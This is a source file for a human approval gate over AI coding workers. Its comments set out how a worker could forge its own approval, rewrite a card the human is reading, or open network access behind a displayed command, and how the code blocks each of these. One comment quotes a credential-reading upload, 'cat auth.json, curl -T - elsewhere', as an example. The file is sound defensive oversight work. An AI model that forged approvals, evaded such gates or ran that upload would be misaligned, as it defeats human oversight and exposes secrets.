// A CODEX WORKER'S GATED COMMAND AND ITS PATCH, ON THE CARD SHE ALREADY KNOWS.
//
// main/codex-app-server.mjs raises a server request to a callback and answers
// whatever that callback returns, with a fifteen-minute deadline and a deny on
// every failure path. It shipped with nobody on the other end and said so:
// "the slice that builds the card is the slice that passes a handler". This is
// the handler, and it is joined to the spool Agentbox already has rather than to
// a second one -- main/approvals.mjs writes and reads
// `<storeRoot>/.approvals/<uuid>.request.json`, main/ipc.mjs answers it, and
// renderer/src/App.tsx draws the card's `<pre>` off `input` without knowing
// which engine asked. A second card format would be a second thing to keep
// true, so a file change goes on the SAME card as a command.
//
// ------------------------------------------------------------------------
// THE ANSWER DOES NOT COME OFF THE DISK, AND THAT IS THE WHOLE SECURITY
// ARGUMENT OF THIS FILE.
//
// The spool sits INSIDE the store root, which workers are given. A Claude Code
// worker is granted it outright (`writeWorkerSettings` puts the store root in
// `additionalDirectories`, and `worker-permissions.json` allows Bash broadly),
// so on that engine a worker able to run a shell could in principle write
// `<uuid>.answer.json` and approve itself. That path has no alternative: the
// thing waiting for the answer is a separate process
// (main/approval-prompt-server.mjs) and a file is the only channel it has.
//
// HERE THE THING WAITING IS AGENTBOX ITSELF, so it does not need one. The
// founder's decision arrives through main/ipc.mjs's single answering door and
// is handed to `settle` in process; nothing on this path ever reads an answer
// file. A `<id>.answer.json` that appears for a request still waiting was
// therefore not written by her, and the poll below DELETES it -- so a forgery
// is not a weaker approval, it is not an approval, and it does not even leave
// her card hidden.
//
// What the sandbox contributes, measured on this Mac 2026-09-04 against
// codex-cli 0.148.0 by running `command/exec` under `sandboxPolicy: {type:
// "workspaceWrite", writableRoots: []}` with the cwd set to a product folder
// inside a store root under $HOME:
//
//     write inside the cwd                        exit 0
//     write <storeRoot>/.approvals/x.answer.json  "Operation not permitted"
//     write <storeRoot>/poke.txt                  "Operation not permitted"
//     write under $TMPDIR                         exit 0
//
// So a Codex worker's own commands cannot reach the spool -- with the caveat on
// the last line, which is real: `workspace-write` leaves /tmp and $TMPDIR
// writable (`excludeSlashTmp` and `excludeTmpdirEnvVar` both default to false),
// so a store root under either of those would be reachable. Hers is `~/Zero`.
// The first run of that probe put its fixture store in `os.tmpdir` and every
// write "succeeded", which is the false negative worth remembering.
//
// That residue is closed as of 2026-09-05 and is written here so nobody
// reintroduces it. It used to read: between a forged write and the poll that
// removes it, `listPending` hides that card, because hiding a request that has
// an answer file is main/approvals.mjs's rule and it is shared with the Claude
// path. That shared rule now checks the founder's signature, so an answer file
// she did not write hides nothing on either engine -- and the Claude path,
// where the answer really does come off the disk, stopped believing one at the
// same time. main/approvals.mjs holds that argument and what it does not close.

import crypto from 'node:crypto';
import fs from 'node:fs';
import { appendSpoolLine, cardDigest, removeSpoolEntry, spoolDir, spoolEntryExists, writeSpoolFile } from './approvals.mjs';

// Her deadline and her refusal word, both taken from the transport rather than
// written again: it closes its own card on the same clock, and a second copy of
// fifteen minutes would be a second chance to disagree about how long she has.
import { APPROVAL_TIMEOUT_MS, REFUSAL_DECISION } from './codex-app-server.mjs';

// The four words a file change is described by, taken from the reader that
// already writes them into her trace rather than written a second time here.
import { fileVerbWord } from './codex.mjs';
import { Name, isOurSlug } from '../shared/product-name.mjs';

/**
 * How often a waiting card looks for a file nobody should have written. The
 *  same beat main/approval-prompt-server.mjs polls its answers on. */
export const POLL_MS = 2_000;

/** The word that lets her yes through. */
const ACCEPT_DECISION = 'accept';

/**
 * HOW MUCH OF WHAT SHE IS APPROVING GOES ON THE CARD, AND THE ONLY PLACE IT IS
 * DECIDED. One number for both shapes, because one card draws both.
 *
 * The renderer used to slice this to 400 characters, silently, while nothing
 * capped it here -- so she read four hundred characters and authorised however
 * many there were. THE DISPLAY BOUNDARY AND THE ENFORCEMENT BOUNDARY MUST NOT
 * DIFFER, and on this engine that is not a corner case: Codex reads, searches
 * and edits BY RUNNING SHELL COMMANDS, so a long command is the ordinary shape
 * of the thing she is being asked about.
 *
 * Four thousand, which is comfortably above any real command (`sed -n
 * '1,200p' <path>` and a long `git log` filter are tens of characters, not
 * thousands) and short of a card that cannot be read at all. Past it the string
 * is cut ONCE, here, with a mark saying exactly how much went -- so the worst
 * case is a card that says out loud it is not the whole thing, rather than one
 * that looks complete and is not. The `<pre>` on the other end scrolls
 * (max-height 120px, overflow-y auto in renderer/src/styles.css), so everything
 * on the card really is reachable.
 *
 * A PATCH IS THE SHAPE THAT WILL REACH IT FIRST, and the trade-off is stated
 * rather than left to be found: the cut is taken off the END, so a change
 * touching more files than four thousand characters can hold loses the LAST
 * files named rather than the first. That is the same direction the command
 * path cuts in, and the mark says how much went either way.
 */
export const CARD_CAP = 4_000;

/**
 * THE FOUR PROTOCOL WORDS `NetworkApprovalContext` CAN CARRY, and nothing else
 * is ever printed as one. Read off the CLI's own schema dump 2026-09-05,
 * `NetworkApprovalProtocol`.
 */
const NETWORK_PROTOCOLS = ['http', 'https', 'socks5Tcp', 'socks5Udp'];

/** The destination a network approval opens, as one line, or nothing. */
function networkHost(context) {
  if (!context || typeof context !== 'object' || Array.isArray(context)) return '';
  const host = typeof context.host === 'string' ? context.host.trim() : '';
  if (!host) return '';
  const protocol = typeof context.protocol === 'string' ? context.protocol.trim() : '';
  return NETWORK_PROTOCOLS.includes(protocol) ? `${host} over ${protocol}` : host;
}

/**
 * THE MARK ON AN ELICITATION THAT MAKES IT A TOOL-CALL APPROVAL rather than a
 * form asking her to type something, and the only thing that is read to tell
 * the two apart. Measured on this Mac 2026-09-22, codex-cli 0.153.4: an MCP
 * tool call under `approvalPolicy: untrusted` arrives as
 * `mcpServer/elicitation/request` carrying `_meta.codex_approval_kind:
 * "mcp_tool_call"`, a `message` written by Codex naming the server and the
 * tool, and a `requestedSchema` with no properties at all.
 */
export const MCP_TOOL_CALL_KIND = 'mcp_tool_call';

/** True for the elicitation that is asking whether an MCP tool may run. */
export function isMcpToolCall(params) {
  const meta = params?._meta;
  if (!meta || typeof meta !== 'object' || Array.isArray(meta)) return false;
  return meta.codex_approval_kind === MCP_TOOL_CALL_KIND;
}

/** The MCP server this elicitation came from, or ''. */
export function elicitationServer(params) {
  return typeof params?.serverName === 'string' ? params.serverName.trim() : '';
}

/**
 * IS THIS ELICITATION OUR OWN STORE, ASKED SO THAT A RENAME CANNOT ANSWER NO.
 *
 * `storeServer` is the name this app wrote into THIS thread's config, so on a
 * thread that started today the two are the same string and this is an equality
 * test. It is not an equality test on a thread that started before the app was
 * renamed, and those are ordinary: a Codex thread is resumed for every reply
 * she writes, the resume is a deep merge over the thread's own config, and the
 * server the old thread registered under the old slug is still on it. The model
 * reads its own transcript, calls the tool by the name it called it by last
 * time, and the app then fails to recognise its own store and either asks her
 * to approve her own plumbing or refuses it.
 *
 * So the question is asked of the app's name history, which `WAS` already keeps
 * for the data folder and the env vars. NOTHING HERE WIDENS THE GRANT BEYOND
 * THIS APP: a name we have never had is not ours, a run with no store server is
 * not covered at all (see `ask`), and the only servers that can be on a worker
 * thread are the ones `mcpIsolation` put there.
 */
export function isStoreElicitation(params, storeServer) {
  if (!storeServer) return false;
  const server = elicitationServer(params);
  if (!server) return false;
  return server === String(storeServer).trim() || isOurSlug(server);
}

/**
 * ONE MCP TOOL CALL AS A CARD, drawn out of the elicitation itself.
 *
 * There is no itemId on an elicitation and so no `seen` memory to draw it from:
 * what it carries is the server's name, Codex's own sentence naming the tool,
 * and the arguments. Those three are the question, and the arguments are the
 * half that matters, because `claim_work_item` and `write_document` are the
 * same shape of call and two very different things to allow.
 *
 * NOTHING IS INVENTED WHEN THE SENTENCE IS MISSING. A card that says only
 * "an MCP tool" is a card she cannot answer, so this returns null and `ask`
 * refuses out loud, which is the rule the rest of this file already follows.
 */
export function mcpToolCard(params) {
  // ONLY THE APPROVAL, NEVER THE FORM. The same channel carries an MCP server's
  // own `elicitation/create`, which is a request for typed input against a real
  // `requestedSchema`. Drawing that as an allow-or-deny card would put a
  // question with no answer in front of her, so it is left to `ask` to refuse.
  if (!isMcpToolCall(params)) return null;
  const server = elicitationServer(params);
  const said = typeof params?.message === 'string' ? params.message.trim() : '';
  if (!said) return null;
  const input = { description: said };
  if (server) input.server = server;
  const args = params?._meta?.tool_params;
  if (args && typeof args === 'object' && Object.keys(args).length) {
    try {
      input.arguments = readable(JSON.stringify(args, null, 2));
    } catch { /* an unserialisable argument is left off rather than guessed at */ }
  }
  return { tool: 'Mcp', input };
}

/** Whole, or cut once with the size of the cut said out loud. */
function readable(text) {
  if (text.length <= CARD_CAP) return text;
  const dropped = text.length - CARD_CAP;
  return `${text.slice(0, CARD_CAP)}\n[+${dropped} character${dropped === 1 ? '' : 's'} not shown]`;
}

/**
 * ONE `fileChange` ITEM AS THE CARD ITS APPROVAL WILL BE DRAWN AS, or null when
 * there is nothing in it that can be said out loud.
 *
 * The approval request itself carries none of this (see `codexApprovalCard`);
 * the ITEM does, and it goes past first. Every change in the item is on the
 * card, because one `apply_patch` can touch several files and she is being
 * asked about all of them at once -- measured: the first patch of the 09-04
 * turn carried an add and a delete together.
 *
 * A CREATION IS NOT A DIFF. `diff` is a unified diff for an `update` and RAW
 * FILE CONTENT for an `add`, so nothing here parses it -- it is her file,
 * printed under the name of her file, whichever of the two shapes it arrived
 * in.
 *
 * `tool` is the word on the card's hint line. One verb for a patch that did one
 * thing, and the class word for a patch that did several, because "Write" over
 * a card that also deletes something would be the card lying about half of
 * itself.
 */
export function fileChangeCard(item) {
  const blocks = [];
  const words = [];
  for (const change of Array.isArray(item?.changes) ? item.changes : []) {
    const word = fileVerbWord(change);
    if (!word) continue;
    const from = String(change.path).trim();
    const head = word === 'Move'
      ? `Move ${from} -> ${String(change.kind.move_path).trim()}`
      : `${word} ${from}`;
    // A trailing newline is a line terminator, not an empty last line -- the
    // same rule `splitLines` states in main/codex.mjs, and ONE of them, so a
    // file that really does end in blank lines still shows them.
    const body = String(change.diff ?? '').replace(/\n$/, '');
    blocks.push(body ? `${head}\n${body}` : head);
    if (!words.includes(word)) words.push(word);
  }
  if (!blocks.length) return null;
  return { tool: words.length === 1 ? words[0] : 'Edit', input: { changes: readable(blocks.join('\n\n')) } };
}

/**
 * HOW MANY OF A WORKER'S CHANGES ARE HELD WAITING FOR AN APPROVAL TO NAME THEM.
 *
 * Measured, an approval follows its own `item/started` immediately, so one
 * would do; this exists because "immediately" is an observation about 0.148.0
 * and not a promise, and a turn can have several patches in flight.
 *
 * It is a real bound and not a gesture, which is the lesson CHANGE_FRAME_CAP in
 * main/codex.mjs already records: a frame count is not a memory bound when each
 * frame can carry a whole file. What is held here is the CARD, already cut to
 * `CARD_CAP`, so the worst case is thirty-two times four thousand characters --
 * about 130 KB per worker, and nothing a run that edits in a loop can grow.
 */
export const REMEMBERED_CHANGES = 32;

/**
 * ONE APPROVAL REQUEST AS A CARD, or nothing.
 *
 * `Bash` and `command` are not a new vocabulary invented for this engine: they
 * are the two keys renderer/src/App.tsx already reads off `input`, and Codex
 * really does read, search and edit by running shell commands, so the honest
 * spelling is also the matching one. `reason` becomes `description`, which is
 * the line the card draws above the command.
 *
 * ------------------------------------------------------------------------
 * A PATCH IS CARDED FROM THE ITEM, NOT FROM THE APPROVAL, AND THAT IS WHAT
 * LETS A CODEX WORKER WRITE A FILE AT ALL.
 *
 * `FileChangeRequestApprovalParams` carries itemId, threadId, turnId,
 * startedAtMs, an optional reason and an optional `grantRoot`. No path, no
 * diff, no sentence -- measured in full on 2026-09-04:
 *
 *   {"threadId":"...","turnId":"...","itemId":"call_eBjH...",
 *    "startedAtMs":1788504140524,"reason":null,"grantRoot":null}
 *
 * So this file used to refuse it, correctly on its own terms and at a price
 * that turned out to be the whole integration. `WORKER_APPROVAL_POLICY` is
 * `untrusted` (main/codex-session.mjs), which is the only policy that cards
 * risky commands, and it also cards every patch -- so a refusal here was a
 * worker that could not write one file. Measured, cwd a fresh git repo,
 * sandbox `workspace-write`:
 *
 *   untrusted   risky commands CARDED, in-workspace patch raised the
 *               undrawable fileChange -> refused -> nothing written
 *   on-request  commands NOT carded, patch ran unasked (so did a `curl` to
 *               the open internet on a second probe)
 *   granular    commands NOT carded, patch ran unasked
 *
 * THE CARD CAN BE DRAWN HONESTLY AFTER ALL. `item/started` for the same
 * fileChange arrives BEFORE the approval and carries the real content --
 * three approvals out of three in the measured turn, `item/completed` only
 * ever AFTER the answer:
 *
 *   item/started    fileChange id=call_ylWd... changes=2
 *   APPROVAL        item/fileChange/requestApproval itemId=call_ylWd...
 *   item/completed  fileChange id=call_ylWd... changes=2
 *
 * `seen` is that memory, one per worker (see `scope` below), and the card is
 * the one `fileChangeCard` already built when the item went past.
 *
 * AN ITEM THIS WORKER NEVER SAW IS STILL REFUSED, and that is the line that
 * must not move: a card she answers blind is the 2026-08-05 flood again, so an
 * approval naming an unknown change gets null and the transport's deny, exactly
 * as before. Refusing is cheap and visible -- it goes to the worker's own
 * stderr, so `troubleCause` and the run trace both carry it.
 *
 * `item/permissions/requestApproval` IS STILL REFUSED OUTRIGHT, and there is no
 * item behind it to rescue it: it is answered with a granted-permissions
 * profile rather than a decision, and its params carry nothing that could be
 * put in front of her as a sentence saying what she is allowing.
 *
 * A command approval WITH NO COMMAND is NOT the same judgement any more, and
 * that is the correction. The schema makes `command` nullable, and this used to
 * look at the first parsed action and then refuse -- while the same params
 * carried `networkApprovalContext`, which names the host the sandbox would be
 * opened to. Refusing something we could have described honestly is the
 * opposite failure to carding something we could not, and it is worse: it
 * denies work she would have allowed and tells her nothing about why.
 *
 * AND THE NETWORK GRANT GOES ON THE CARD BESIDE THE COMMAND, WHICH IS THE HALF
 * THAT WAS SILENTLY MISSING. `curl` and the host it reaches are two facts and
 * the card drew one of them, so she could authorise a displayed command without
 * seeing the destination it opens. Measured from the CLI's own schema dump on
 * this Mac 2026-09-05 (`codex app-server generate-json-schema --out <dir>`,
 * codex-cli 0.148.0), CommandExecutionRequestApprovalParams:
 *
 *   networkApprovalContext  { host: string,
 *                             protocol: "http"|"https"|"socks5Tcp"|"socks5Udp" }
 *                           | null   "Optional context for a managed-network
 *                                     approval prompt."
 *   commandActions          CommandAction[] | null, every variant carrying its
 *                           own `command` string -- "Best-effort parsed command
 *                           actions for friendly display."
 *
 * `commandActions` IS READ IN FULL RATHER THAN AT ITS FIRST ENTRY, for the
 * reason `readable` exists at all: the display boundary and the enforcement
 * boundary must not differ, and `[cat auth.json, curl -T - elsewhere]` shown as
 * its first line is a card that is true about a tenth of what it authorises.
 *
 * THE PROTOCOL IS PRINTED ONLY WHEN IT IS ONE OF THE FOUR WORDS THE SCHEMA
 * ENUMERATES. A release that adds a fifth would otherwise put an unvouched-for
 * word under a question about her machine; the host is the fact either way, so
 * the host is said either way.
 *
 * WHAT AN ALLOW IS STILL NOT. `CommandExecutionApprovalDecision` also holds
 * `acceptWithExecpolicyAmendment` and `applyNetworkPolicyAmendment`, which
 * write a PERSISTENT rule for a command shape or a host, and the params carry
 * `proposedExecpolicyAmendment` and `proposedNetworkPolicyAmendments` offering
 * them. This file answers `accept` or `decline` and nothing else, so one card is
 * one request and a yes she gave to one command never becomes a standing grant.
 */
export function codexApprovalCard(method, params, seen = null) {
  const p = params ?? {};

  if (method === 'mcpServer/elicitation/request') return mcpToolCard(p);

  if (method === 'item/fileChange/requestApproval') {
    const itemId = typeof p.itemId === 'string' ? p.itemId : '';
    const known = itemId ? seen?.get?.(itemId) ?? null : null;
    if (!known) return null;
    const input = { ...known.input };
    const why = typeof p.reason === 'string' ? p.reason.trim() : '';
    if (why) input.description = why;
    // THE TREE THE PATCH ASKS TO OPEN, WHICH IS NOT IN THE DIFF ABOVE IT.
    // `grantRoot`, from the same schema dump: "[UNSTABLE] When set, the agent is
    // asking the user to allow writes under this root for the remainder of the
    // session." So an accept on one visible file can be read as opening a whole
    // tree until the run ends, and the card drew the file. Nearly every patch
    // sends null and then nothing is added, exactly as `cwd` behaves.
    const root = typeof p.grantRoot === 'string' ? p.grantRoot.trim() : '';
    if (root) input.grantRoot = root;
    return { tool: known.tool, input };
  }

  if (method !== 'item/commandExecution/requestApproval') return null;
  const spoken = typeof p.command === 'string' ? p.command.trim() : '';
  const parsed = Array.isArray(p.commandActions)
    ? p.commandActions.map((a) => (typeof a?.command === 'string' ? a.command.trim() : '')).filter(Boolean).join('\n')
    : '';
  const command = spoken || parsed;
  const host = networkHost(p.networkApprovalContext);
  if (!command && !host) return null;
  const input = {};
  if (command) input.command = readable(command);
  if (host) input.host = host;
  // WHERE IT WOULD RUN, WHICH IS HALF OF WHAT THE COMMAND MEANS. `cat
  // auth.json` in a scratch clone and `cat auth.json` in her home directory are
  // the same eleven characters and two different questions.
  // `CommandExecutionRequestApprovalParams` has carried `cwd` all along -- "The
  // command's working directory", read out of the CLI's own
  // `generate-json-schema` dump on 2026-09-04 -- and nothing was reading it.
  // Left OFF entirely when the server did not say one, because a card drawing
  // the word "undefined" under a command is worse than a card drawing nothing.
  const cwd = typeof p.cwd === 'string' ? p.cwd.trim() : '';
  if (cwd) input.cwd = cwd;
  const reason = typeof p.reason === 'string' ? p.reason.trim() : '';
  if (reason) input.description = reason;
  return { tool: 'Bash', input };
}

/**
 * THE SPOOL, FROM AGENTBOX'S SIDE OF IT.
 *
 * One of these per supervisor, shared by every Codex worker on the machine:
 * the request ids are UUIDs and the founder answers them one at a time, so
 * there is nothing per-worker to keep apart.
 *
 * `uuid` and `now` are injected so a test can name a card, and `timeoutMs` and
 * `pollMs` so it does not have to wait a quarter of an hour to watch a silence
 * deny itself.
 */
export function createCodexApprovals({
  storeRoot,
  timeoutMs = APPROVAL_TIMEOUT_MS,
  pollMs = POLL_MS,
  uuid = () => crypto.randomUUID(),
  now = () => Date.now(),
  onChange = null,
} = {}) {
  const dir = spoolDir(storeRoot);
  const open = new Map(); // id -> { request, scope, decide, deadline, poll }

  /**
   * Ask her one question, and never come back with nothing.
   *
   * The promise this returns is the one main/codex-app-server.mjs is holding
   * the server request open on. It resolves with a word the transport can
   * translate, or with the refusal; it never rejects and it never hangs,
   * because a promise nobody settles is a worker parked with no exit code and
   * nothing on the row, which is the failure that file was written around.
   */
  const ask = (context, method, params, seen = null) => new Promise((resolve) => {
    // AGENTBOX'S OWN STORE TOOLS ARE NOT A QUESTION FOR THE FOUNDER, AND ASKING
    // HER ONE FOR EACH OF THEM WOULD BE THE SAME FAILURE AS REFUSING THEM.
    //
    // A Codex worker reaches the store the only way this engine has: an MCP tool
    // call, which under `untrusted` raises the elicitation above. Claiming a
    // row, writing a checkpoint and finishing one are therefore three cards she
    // would have to press before a worker could say anything at all, on every
    // run, and that is the plumbing rather than the work. The Claude Code path
    // says the same thing in its own grammar and has all along: the store
    // server's tools are granted outright in `worker-permissions.json` and never
    // reach her spool.
    //
    // THE NAME IS THE ONE AGENTBOX LAUNCHED, not one a worker can claim. It comes
    // from `_codexStoreServer` through `scope`, and the only servers on a worker
    // thread are the ones `mcpIsolation` wrote into `thread/start` -- everything
    // in her own config is switched off there by name. So a server answering to
    // this name is the one this app started, with the account id, the product
    // and the work item already fixed in its environment.
    //
    // EVERY OTHER MCP TOOL CALL STILL GOES TO HER, as a card drawn by
    // `mcpToolCard`, and a personal session (which is given no store server at
    // all) has nothing that takes this path.
    if (method === 'mcpServer/elicitation/request'
      && isMcpToolCall(params)
      && isStoreElicitation(params, context?.storeServer)) {
      resolve(ACCEPT_DECISION);
      return;
    }

    const card = codexApprovalCard(method, params, seen);
    if (!card) {
      // VISIBLE ON THE RUN, NOT ONLY IN A LOG SHE WILL NEVER OPEN.
      //
      // Anything that cannot be described is refused, and that is right rather
      // than lazy: a card she answers blind is the 2026-08-05 flood again. But
      // the only signal used to be a `console.warn`, which reaches no screen, no
      // row and no trace, so the symptom of a worker being refused every edit it
      // tried was a run that talked and changed nothing.
      //
      // THE TWO REASONS ARE NOT THE SAME REASON and the line says which, because
      // one of them is a live defect and the other is a decision. A `permissions`
      // request carries nothing describable at all. A `fileChange` naming an item
      // this worker never saw means the memory the card is drawn from missed it,
      // which is something to go and look at (see `remember` below).
      //
      // `context.say` is the worker's own stderr emitter, which is the pipe
      // `troubleCause` classifies a dead run from and the one the persisted
      // trace records. The console line stays for a scope nobody wired a `say`
      // to, which is a test and never a worker.
      const why = method === 'item/fileChange/requestApproval'
        ? 'this run never saw the file change it names, so there is nothing it could put in front of the founder to answer'
        : method === 'mcpServer/elicitation/request'
          ? 'an MCP server asked this run a question of its own, and a form only the founder could fill in is not something this app can answer for her'
          : 'that approval carries no command, no path and no diff, so there is nothing it could put in front of the founder to answer';
      const line = `${Name} refused a ${method} from this run: ${why}`;
      if (typeof context?.say === 'function') context.say(line);
      else console.warn(`zero: ${line}`);
      resolve(REFUSAL_DECISION);
      return;
    }

    const id = String(uuid());
    const request = {
      id,
      at: now(),
      product: context?.product ?? null,
      item: context?.item ?? null,
      tool: card.tool,
      input: card.input,
    };

    // EVERY TOUCH OF THE SPOOL GOES THROUGH main/approvals.mjs, because that
    // directory is worker-writable and the rule about what may be opened in it
    // belongs in one place. `writeSpoolFile` creates at a name nothing can
    // guess and renames onto the real one, so nothing here can be pre-created
    // or followed.
    let put = false;
    try {
      fs.mkdirSync(dir, { recursive: true });
      put = writeSpoolFile(dir, `${id}.request.json`, JSON.stringify(request));
    } catch (err) {
      console.warn('zero: could not put a codex approval in the spool:', err?.message ?? err);
    }
    if (!put) {
      // A question that cannot be asked has already been answered.
      resolve(REFUSAL_DECISION);
      return;
    }

    const entry = {
      request,
      // WHICH WORKER ASKED. A card is a question one run is parked on, so it
      // has no meaning once that run has stopped -- see `scope` below.
      scope: context?.scope ?? null,
      decide(allow, note, extra) {
        if (!open.delete(id)) return false;
        clearTimeout(entry.deadline);
        clearInterval(entry.poll);
        finish(id, request, { allow: !!allow, note: note ?? null, at: now(), ...extra });
        resolve(allow ? ACCEPT_DECISION : REFUSAL_DECISION);
        return true;
      },
    };
    entry.deadline = setTimeout(() => entry.decide(false, null, { timeout: true }), timeoutMs);
    entry.deadline?.unref?.();
    // NOBODY SHOULD EVER WRITE THIS FILE. Her answer comes in through `settle`,
    // so one on the disk is a worker's, and it is removed rather than read.
    entry.poll = setInterval(() => sweepForgery(id), pollMs);
    entry.poll?.unref?.();
    open.set(id, entry);
    onChange?.();
  });

  function sweepForgery(id) {
    if (!open.has(id)) return;
    const forged = `${id}.answer.json`;
    // `lstat`, not `existsSync`: a dangling link is an entry `readdir` can see,
    // so `listPending` hides her card for it while `existsSync` reports
    // nothing to sweep. And `rm`, not `unlink`, because a worker can squat the
    // name with a directory, which `unlink` refuses (EPERM, measured) and
    // which would then hide the card until the spool's own TTL.
    if (!spoolEntryExists(dir, forged)) return;
    removeSpoolEntry(dir, forged);
    console.warn(`zero: an answer file appeared for approval ${id} that the founder did not write; it has been deleted and the card is still waiting`);
    onChange?.();
  }

  /**
   * One audit line per decision, and the pair leaves the spool. The same
   *  ending main/approval-prompt-server.mjs gives a Claude Code worker's card,
   *  because nothing else is going to reap these. */
  function finish(id, request, decided) {
    // Never held hostage to its own log line, which is why the return is
    // ignored -- and why `appendSpoolLine` destroys a planted link rather than
    // only refusing to follow one: a silent refusal here would hand a worker
    // the audit trail for good.
    appendSpoolLine(dir, 'log.jsonl', `${JSON.stringify({ ...request, answer: decided, decidedAt: now() })}\n`);
    for (const f of [`${id}.request.json`, `${id}.answer.json`]) removeSpoolEntry(dir, f);
    onChange?.();
  }

  let scopes = 0;

  return {
    /**
     * ONE WORKER'S CARDS, AND A WAY TO END THEM WITH IT.
     *
     * Every Codex worker used to raise into one fleet-wide map with nothing
     * per-worker in it, so killing a worker ended its facade and interrupted its
     * turn and did NOT deny or remove its card. A stopped, preempted, archived
     * or app-server-lost worker left a live-looking question on screen for the
     * full fifteen minutes.
     *
     * That is not a card that merely lingers. `listPending` sorts oldest first
     * and every answering route acts on `listPending[0]`, so the DEAD card sits
     * in front of every real one until its deadline: she presses ⌘Y for the
     * card she is reading and answers a worker that stopped ten minutes ago.
     *
     * `close` is what the worker's own exit calls. It denies this scope's open
     * cards, once each, through the same `decide` her answer goes through -- so
     * the audit line is written, the request file leaves the spool, and the
     * promise the transport is holding the server request open on resolves with
     * the refusal rather than being dropped.
     */
    scope: (context = {}) => {
      const id = `scope-${scopes += 1}`;
      const bound = { ...context, scope: id };
      // WHAT THIS WORKER HAS CHANGED, WAITING FOR THE APPROVAL THAT NAMES IT.
      // Per worker and not per fleet, because an `itemId` is the app-server's
      // own string and one process carries every Codex thread on the Mac: a
      // shared memory would let thread A's patch answer thread B's question.
      // It goes when the worker does, which is what `close` is for.
      const seen = new Map(); // itemId -> the card its approval will be drawn as
      return {
        /**
         * ONE NOTIFICATION, LOOKED AT ONLY FOR THE CHANGE IT MIGHT CARRY.
         *
         * `item/started` and nothing else, because that is the event measured to
         * arrive BEFORE the approval; `item/completed` carries the same changes
         * and arrives only after the answer, so a memory fed from it would
         * always be one beat too late and would hold changes nothing will ask
         * about again.
         *
         * Called on the session's own event path, so it is written to be unable
         * to throw there: a reader that throws inside the supervisor's stream
         * loop takes itself out for the rest of the session, which is a worker
         * that keeps running and reports nothing.
         */
        remember: (method, params) => {
          try {
            if (method !== 'item/started') return;
            const item = params?.item;
            if (item?.type !== 'fileChange' || typeof item.id !== 'string' || !item.id) return;
            const card = fileChangeCard(item);
            if (!card) return;
            seen.set(item.id, card);
            // Oldest out first. A Map keeps insertion order and re-setting a key
            // does not move it, so this is the first change this worker made.
            while (seen.size > REMEMBERED_CHANGES) seen.delete(seen.keys().next().value);
          } catch { /* a card is never worth a session */ }
        },
        handle: (method, params) => ask(bound, method, params, seen),
        close: (why = 'the worker that asked this has stopped') => {
          seen.clear();
          let closed = 0;
          for (const entry of [...open.values()]) {
            if (entry.scope !== id) continue;
            if (entry.decide(false, why, { closed: true })) closed += 1;
          }
          return closed;
        },
      };
    },

    /**
     * THE FOUNDER ANSWERED, and this is the only thing in the app that can say
     * so. Called by main/ipc.mjs beside `approvals.answer`, in the same
     * synchronous breath, so the two engines answer through one door.
     *
     * False for anything that is not an open Codex card: a Claude Code
     * worker's request, or one this deadline already denied. Her late click on
     * a card the clock closed twenty minutes ago must not approve a command
     * the turn stopped waiting for.
     */
    settle: (id, allow, note) => open.get(String(id))?.decide(allow, note) ?? false,

    /**
     * WHETHER THE CARD SHE READ IS STILL THE QUESTION THIS TURN IS PARKED ON.
     *
     * The answer does not come off the disk here -- that is the argument at the
     * top of this file -- but the CARD does: it is drawn out of the same
     * worker-writable spool `listPending` reads, and a Claude Code worker on the
     * same Mac is granted that directory outright. So a Codex worker's card can
     * be rewritten under it by the other engine, and `settle` would honour her
     * Allow against the request still sitting in `open`, which is the one she
     * never saw.
     *
     * `shown` is `approvals.cardShown`, the digest of what was last handed to
     * her screen. This compares it against the request Agentbox itself built and
     * has held in memory ever since, so nothing in the comparison has been off
     * the disk twice. A digest that cannot be taken counts as changed, because
     * the safe answer is the one that has to be the accident.
     *
     * FALSE FOR AN ID THIS ENGINE HAS NEVER HEARD OF, which is every Claude Code
     * card and every card the deadline already closed. The door asks this about
     * both engines' cards, and turning her Allow on a Claude Code card into a
     * deny would be this method inventing a refusal she never got.
     */
    changed: (id, shown) => {
      const entry = open.get(String(id));
      if (!entry) return false;
      const mine = cardDigest(entry.request);
      return !mine || mine !== shown;
    },

    /**
     * Everything still waiting is denied, once. Agentbox is going away and a
     *  worker holding an unanswerable question is a worker holding forever. */
    close: (why = `${Name} is shutting down`) => {
      for (const entry of [...open.values()]) entry.decide(false, why, { closed: true });
    },

    pending: () => [...open.keys()],
  };
}
